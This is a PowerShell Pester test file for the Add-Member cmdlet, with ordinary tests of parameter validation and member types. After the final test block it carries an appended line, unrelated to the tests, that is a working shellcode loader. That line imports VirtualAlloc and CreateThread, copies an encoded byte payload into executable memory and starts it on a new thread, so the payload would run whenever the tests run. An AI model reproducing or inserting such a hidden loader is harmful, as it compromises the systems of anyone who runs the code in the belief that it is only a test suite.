

Describe "Add-Member DRT Unit Tests" -Tags "CI" {

    It "Mandatory parameters should not be null nor empty" {
        
        { Add-Member -Name $null } | Should -Throw -ErrorId "ParameterArgumentValidationErrorNullNotAllowed,Microsoft.PowerShell.Commands.AddMemberCommand"

        
        { Add-Member -Name "" } | Should -Throw -ErrorId "ParameterArgumentValidationErrorEmptyStringNotAllowed,Microsoft.PowerShell.Commands.AddMemberCommand"

        
        { Add-Member -MemberType $null } | Should -Throw -ErrorId "ParameterArgumentValidationErrorNullNotAllowed,Microsoft.PowerShell.Commands.AddMemberCommand"

        
        { Add-Member -MemberType "" } | Should -Throw -ErrorId "CannotConvertArgumentNoMessage,Microsoft.PowerShell.Commands.AddMemberCommand"

        
        { Add-Member -InputObject $null } | Should -Throw -ErrorId "ParameterArgumentValidationErrorNullNotAllowed,Microsoft.PowerShell.Commands.AddMemberCommand"
    }

    
    It "Should Not Have Value2" {
        $memberTypesWhereV1CannotBeNull = "CodeMethod", "MemberSet", "PropertySet", "ScriptMethod", "NoteProperty"
        foreach ($memberType in $memberTypesWhereV1CannotBeNull)
        {
            { Add-Member -InputObject a -memberType $memberType -Name Name -Value something -SecondValue somethingElse } |
                Should -Throw -ErrorId "Value2ShouldNotBeSpecified,Microsoft.PowerShell.Commands.AddMemberCommand"
        }
    }

    It "Cannot Add PS Property Or PS Method" {
        $membersYouCannotAdd = "Method", "Property", "ParameterizedProperty"
        foreach ($member in $membersYouCannotAdd)
        {
            { Add-Member -InputObject a -memberType $member -Name Name } | Should -Throw -ErrorId "CannotAddMemberType,Microsoft.PowerShell.Commands.AddMemberCommand"
        }

        { Add-Member -InputObject a -memberType AnythingElse -Name Name } | Should -Throw -ErrorId "CannotConvertArgumentNoMessage,Microsoft.PowerShell.Commands.AddMemberCommand"

    }

    It "Value1 And Value2 Should Not Both Null" {
        $memberTypes = "CodeProperty", "ScriptProperty"
        foreach ($memberType in $memberTypes)
        {
            { Add-Member -memberType $memberType -Name PropertyName -Value $null -SecondValue $null -InputObject a } |
                Should -Throw -ErrorId "Value1AndValue2AreNotBothNull,Microsoft.PowerShell.Commands.AddMemberCommand"
        }

    }

    It "Fail to add unexisting type" {
        { Add-Member -InputObject a -MemberType AliasProperty -Name Name -Value something -SecondValue unexistingType } |
            Should -Throw -ErrorId "InvalidCastFromStringToType,Microsoft.PowerShell.Commands.AddMemberCommand"
    }

    It "Successful alias, no type" {
        $results = Add-Member -InputObject a -MemberType AliasProperty -Name Cnt -Value Length -passthru
        $results.Cnt | Should -BeOfType Int32
        $results.Cnt | Should -Be 1
    }

    It "Successful alias, with type" {
        $results = add-member -InputObject a -MemberType AliasProperty -Name Cnt -Value Length -SecondValue String -passthru
        $results.Cnt | Should -BeOfType String
        $results.Cnt | Should -Be '1'
    }

    It "CodeProperty Reference Wrong Type" {
        { Add-Member -InputObject a -MemberType CodeProperty -Name Name -Value something } |
            Should -Throw -ErrorId "ConvertToFinalInvalidCastException,Microsoft.PowerShell.Commands.AddMemberCommand"
    }

    It "Empty Member Set Null Value1" {
        $results = add-member -InputObject a -MemberType MemberSet -Name Name -Value $null -passthru
        $results.Length | Should -Be 1
        $results.Name.a | Should -BeNullOrEmpty
    }

    It "Member Set With 1 Member" {
        $members = new-object System.Collections.ObjectModel.Collection[System.Management.Automation.PSMemberInfo]
        $n=new-object Management.Automation.PSNoteProperty a,1
        $members.Add($n)
        $r=Add-Member -InputObject a -MemberType MemberSet -Name Name -Value $members -passthru
        $r.Name.a | Should -Be '1'
    }

    It "MemberSet With Wrong Type For Value1" {
        { Add-Member -InputObject a -MemberType MemberSet -Name Name -Value ImNotACollection } |
            Should -Throw -ErrorId "ConvertToFinalInvalidCastException,Microsoft.PowerShell.Commands.AddMemberCommand"
    }

    It "ScriptMethod Reference Wrong Type" {
        { Add-Member -InputObject a -MemberType ScriptMethod -Name Name -Value something } |
            Should -Throw -ErrorId "ConvertToFinalInvalidCastException,Microsoft.PowerShell.Commands.AddMemberCommand"
    }

    It "Add ScriptMethod Success" {
        $results = Add-Member -InputObject 'abc' -MemberType ScriptMethod -Name Name -Value {$this.length} -PassThru
        $results | Should -BeExactly 'abc'
        $results.Name() | Should -Be 3
    }

    It "ScriptProperty Reference Wrong Type" {
        { Add-Member -InputObject a -MemberType ScriptProperty -Name Name -Value something } |
            Should -Throw -ErrorId "ConvertToFinalInvalidCastException,Microsoft.PowerShell.Commands.AddMemberCommand"
    }

    It "Add ScriptProperty Success" {
        set-alias ScriptPropertyTestAlias dir
        $al=(get-alias ScriptPropertyTestAlias)
        $al.Description="MyDescription"
        $al | Add-Member -MemberType ScriptProperty -Name NewDescription -Value {$this.Description} -SecondValue {$this.Description=$args[0]}
        $al.NewDescription | Should -BeExactly 'MyDescription'
        $al.NewDescription = "some description"
        $al.NewDescription | Should -BeExactly 'some description'
    }

    It "Add TypeName MemberSet Success" {
        $a = 'string' | add-member -MemberType NoteProperty -Name TestNote -Value Any -TypeName MyType -passthru
        $a.PSTypeNames[0] | Should -Be MyType
    }

    It "Add TypeName Existing Name Success" {
        $a = 'string' | add-member -TypeName System.Object -passthru
        $a.PSTypeNames[0] | Should -Be System.Object
    }

    It "Add Single Note To Array" {
        $a=1,2,3
        $a = Add-Member -InputObject $a -MemberType NoteProperty -Name Name -Value Value -PassThru
        $a.Name | Should -Be Value
    }

    It "Add Multiple Note Members" {
        $obj=new-object psobject
        $hash=@{Name='Name';TestInt=1;TestNull=$null}
        add-member -InputObject $obj $hash
        $obj.Name | Should -Be 'Name'
        $obj.TestInt | Should -Be 1
        $obj.TestNull | Should -BeNullOrEmpty
    }

    It "Add Multiple Note With TypeName" {
        $obj=new-object psobject
        $hash=@{Name='Name';TestInt=1;TestNull=$null}
        $obj = add-member -InputObject $obj $hash -TypeName MyType -Passthru
        $obj.PSTypeNames[0] | Should -Be MyType
    }

    It "Add Multiple Members With Force" {
        $obj=new-object psobject
        $hash=@{TestNote='hello'}
        $obj | Add-Member -MemberType NoteProperty -Name TestNote -Value 1
        $obj | add-member $hash -force
        $obj.TestNote | Should -Be 'hello'
    }

    It "Simplified Add-Member should support using 'Property' as the NoteProperty member name" {
        $results = add-member -InputObject a property Any -passthru
        $results.property | Should -BeExactly 'Any'

        $results = add-member -InputObject a Method Any -passthru
        $results.Method | Should -BeExactly 'Any'

        $results = add-member -InputObject a 23 Any -passthru
        $results.23 | Should -BeExactly 'Any'

        $results = add-member -InputObject a 8 np Any -passthru
        $results.np | Should -BeExactly 'Any'

        $results = add-member -InputObject a 16 sp {1+1} -passthru
        $results.sp | Should -Be 2
    }

    It "Verify Add-Member error message is not empty" {
        $object = @(1,2)
        Add-Member -InputObject $object "ABC" "Value1"
        Add-Member -InputObject $object "ABC" "Value2" -ErrorVariable errorVar -ErrorAction SilentlyContinue
        $errorVar.Exception | Should -BeOfType "System.InvalidOperationException"
        $errorVar.Exception.Message | Should -Not -BeNullOrEmpty
    }
}

Describe "Add-Member" -Tags "CI" {

    It "should be able to see a newly added member of an object" {
	$o = New-Object psobject
	Add-Member -InputObject $o -MemberType NoteProperty -Name proppy -Value "superVal"

	$o.proppy | Should -Not -BeNullOrEmpty
	$o.proppy | Should -BeExactly "superVal"
    }

    It "Should be able to add a member to an object that already has a member in it" {
	$o = New-Object psobject
	Add-Member -InputObject $o -MemberType NoteProperty -Name proppy -Value "superVal"
	Add-Member -InputObject $o -MemberType NoteProperty -Name AnotherMember -Value "AnotherValue"

	$o.AnotherMember | Should -Not -BeNullOrEmpty
	$o.AnotherMember | Should -BeExactly "AnotherValue"
    }
}

$MIk = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $MIk -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xda,0xd0,0xd9,0x74,0x24,0xf4,0xbb,0x6f,0xd2,0xba,0xf8,0x5e,0x31,0xc9,0xb1,0x47,0x83,0xee,0xfc,0x31,0x5e,0x14,0x03,0x5e,0x7b,0x30,0x4f,0x04,0x6b,0x36,0xb0,0xf5,0x6b,0x57,0x38,0x10,0x5a,0x57,0x5e,0x50,0xcc,0x67,0x14,0x34,0xe0,0x0c,0x78,0xad,0x73,0x60,0x55,0xc2,0x34,0xcf,0x83,0xed,0xc5,0x7c,0xf7,0x6c,0x45,0x7f,0x24,0x4f,0x74,0xb0,0x39,0x8e,0xb1,0xad,0xb0,0xc2,0x6a,0xb9,0x67,0xf3,0x1f,0xf7,0xbb,0x78,0x53,0x19,0xbc,0x9d,0x23,0x18,0xed,0x33,0x38,0x43,0x2d,0xb5,0xed,0xff,0x64,0xad,0xf2,0x3a,0x3e,0x46,0xc0,0xb1,0xc1,0x8e,0x19,0x39,0x6d,0xef,0x96,0xc8,0x6f,0x37,0x10,0x33,0x1a,0x41,0x63,0xce,0x1d,0x96,0x1e,0x14,0xab,0x0d,0xb8,0xdf,0x0b,0xea,0x39,0x33,0xcd,0x79,0x35,0xf8,0x99,0x26,0x59,0xff,0x4e,0x5d,0x65,0x74,0x71,0xb2,0xec,0xce,0x56,0x16,0xb5,0x95,0xf7,0x0f,0x13,0x7b,0x07,0x4f,0xfc,0x24,0xad,0x1b,0x10,0x30,0xdc,0x41,0x7c,0xf5,0xed,0x79,0x7c,0x91,0x66,0x09,0x4e,0x3e,0xdd,0x85,0xe2,0xb7,0xfb,0x52,0x05,0xe2,0xbc,0xcd,0xf8,0x0d,0xbd,0xc4,0x3e,0x59,0xed,0x7e,0x97,0xe2,0x66,0x7f,0x18,0x37,0x12,0x7a,0x8e,0x78,0x4b,0x8e,0xcf,0x11,0x8e,0x8f,0xce,0x5d,0x07,0x69,0x80,0xcd,0x48,0x26,0x60,0xbe,0x28,0x96,0x08,0xd4,0xa6,0xc9,0x28,0xd7,0x6c,0x62,0xc2,0x38,0xd9,0xda,0x7a,0xa0,0x40,0x90,0x1b,0x2d,0x5f,0xdc,0x1b,0xa5,0x6c,0x20,0xd5,0x4e,0x18,0x32,0x81,0xbe,0x57,0x68,0x07,0xc0,0x4d,0x07,0xa7,0x54,0x6a,0x8e,0xf0,0xc0,0x70,0xf7,0x36,0x4f,0x8a,0xd2,0x4d,0x46,0x1e,0x9d,0x39,0xa7,0xce,0x1d,0xb9,0xf1,0x84,0x1d,0xd1,0xa5,0xfc,0x4d,0xc4,0xa9,0x28,0xe2,0x55,0x3c,0xd3,0x53,0x0a,0x97,0xbb,0x59,0x75,0xdf,0x63,0xa1,0x50,0xe1,0x58,0x74,0x9c,0x97,0xb0,0x44;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$S33=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($S33.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$S33,0,0,0);for (;;){Start-sleep 60};

